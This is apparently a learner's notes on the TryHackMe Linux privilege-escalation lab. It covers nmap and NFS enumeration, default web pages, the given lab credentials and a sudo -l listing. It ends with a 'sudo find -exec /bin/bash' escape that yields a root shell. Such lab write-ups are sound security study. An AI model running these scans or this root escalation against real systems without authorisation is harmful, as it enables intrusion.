---
title: "linux_PrivEsc"
tags:
  - fetus
---
- room link:https://tryhackme.com/room/linuxprivesc
## nmap results:
- `nmap -sV IP`:
```sh
Nmap scan report for 10.10.161.155
Host is up (0.22s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
25/tcp   open  smtp    Exim smtpd 4.84
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
111/tcp  open  rpcbind 2 (RPC #100000)
2049/tcp open  nfs     2-4 (RPC #100003)
8080/tcp open  http    nginx 1.6.2
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- `nmap -T4 -sCV -p- -oN Dscan.txt 10.10.161.155`:
```sh
# Nmap 7.95 scan initiated Wed Jun  4 03:49:29 2025 as: /usr/lib/nmap/nmap -T4 -sCV -p- -oN Dscan.txt 10.10.161.155
Warning: 10.10.161.155 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.161.155
Host is up (0.21s latency).
Not shown: 65497 closed tcp ports (reset), 29 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp    open  smtp     Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello ip-10-21-154-145.eu-west-1.compute.internal [10.21.154.145], SIZE 52428800, 8BITMIME, PIPELINING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
80/tcp    open  http     Apache httpd 2.2.16 ((Debian))
111/tcp   open  rpcbind
2049/tcp  open  rpcbind
8080/tcp  open  http     nginx 1.6.2
|_http-title: Welcome to nginx on Debian!
41871/tcp open  nlockmgr 1-4 (RPC #100021)
48344/tcp open  rpcbind
56173/tcp open  rpcbind
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  4 04:52:59 2025 -- 1 IP address (1 host up) scanned in 3809.16 seconds
```
- `nmap -T4 -p- -A -oN Ascan.txt 10.10.161.155`:
```sh
# Nmap 7.95 scan initiated Wed Jun  4 03:52:06 2025 as: /usr/lib/nmap/nmap -T4 -p- -A -oN Ascan.txt 10.10.161.155
Warning: 10.10.161.155 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.161.155
Host is up (0.21s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp    open     smtp       Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello ip-10-21-154-145.eu-west-1.compute.internal [10.21.154.145], SIZE 52428800, 8BITMIME, PIPELINING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
80/tcp    open     http       Apache httpd 2.2.16 ((Debian))
|_http-title: Site doesn't have a title (text/html).
111/tcp   open     tcpwrapped
2049/tcp  open     nfs?
5456/tcp  filtered apc-5456
7709/tcp  filtered unknown
7906/tcp  filtered unknown
8080/tcp  open     http       nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-open-proxy: Proxy might be redirecting requests
11384/tcp filtered unknown
20047/tcp filtered unknown
21476/tcp filtered unknown
24683/tcp filtered unknown
28295/tcp filtered unknown
32019/tcp filtered unknown
37812/tcp filtered unknown
40292/tcp filtered unknown
41398/tcp filtered unknown
41444/tcp filtered unknown
41871/tcp open     rpcbind
46460/tcp filtered unknown
48344/tcp open     rpcbind
52598/tcp filtered unknown
52794/tcp filtered unknown
56173/tcp open     rpcbind
60386/tcp filtered unknown
62622/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/4%OT=22%CT=1%CU=40603%PV=Y%DS=2%DC=T%G=Y%TM=68400AA4
OS:%P=x86_64-pc-linux-gnu)SEQ(TI=Z%CI=Z%TS=8)SEQ(TI=Z%CI=Z%II=I%TS=8)SEQ(SP
OS:=109%GCD=1%ISR=10B%TI=Z%CI=Z%TS=8)SEQ(SP=FD%GCD=1%ISR=10D%TI=Z%CI=Z%TS=8
OS:)SEQ(SP=FF%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M509ST11NW5%O2=M509S
OS:T11NW5%O3=M509NNT11NW5%O4=M509ST11NW5%O5=M509ST11NW5%O6=M509ST11)WIN(W1=
OS:45EA%W2=45EA%W3=45EA%W4=45EA%W5=45EA%W6=45EA)ECN(R=Y%DF=Y%T=40%W=4602%O=
OS:M509NNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   226.48 ms 10.21.0.1
2   226.56 ms 10.10.161.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  4 04:58:12 2025 -- 1 IP address (1 host up) scanned in 3966.47 seconds
```
- smtp seems interesting. ill look into it later 
## nfs enumeration:
- `showmount -e IP`:
```sh
╰─[:)] # showmount -e 10.10.161.155
Export list for 10.10.161.155:
/tmp *
```
- huh the tmp folder is shared :0 lets [[mount]] it and see whats in there
- cant seem to be able to mount it for some reason :/ ill get back to nfs enumeration later
## http enumeration (apache and nginx):
- the root page is nothing special on either server:
```html title:apache
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
```
	
```html
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx on Debian!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx on Debian!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working on Debian. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a></p>

<p>
      Please use the <tt>reportbug</tt> tool to report bugs in the
      nginx package with Debian. However, check <a
      href="http://bugs.debian.org/cgi-bin/pkgreport.cgi?ordering=normal;archive=0;src=nginx;repeatmerged=0">existing
      bug reports</a> before reporting a new bug.
</p>

<p><em>Thank you for using debian and nginx.</em></p>


</body>
</html>
```
- lets dirbust with [[feroxbuster]]
- nothing shows up on either. welp ig this is a priv esc machine. doesnt make sense for there to be any web stuff to begin with tbh. lets move on to ssh 
## priv esc start:
- given creds:
```sh
user:password321
```
- ooh that thing from kioptrix xD
```sh
╭─[~/projects/linuxPrivEsc]─[root@DEMONDAYZ]─[0]─[1745]
╰─[:)] # ssh user@10.10.161.155
Unable to negotiate with 10.10.161.155 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```
- yk what ill note down the fix in [[SSH]] for later as well
- im in. omg so many permissions:
```sh
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
- ran `sudo find . -exec /bin/bash \;` and got root. you what ill make a proper priv esc vectors note from this lab for future usage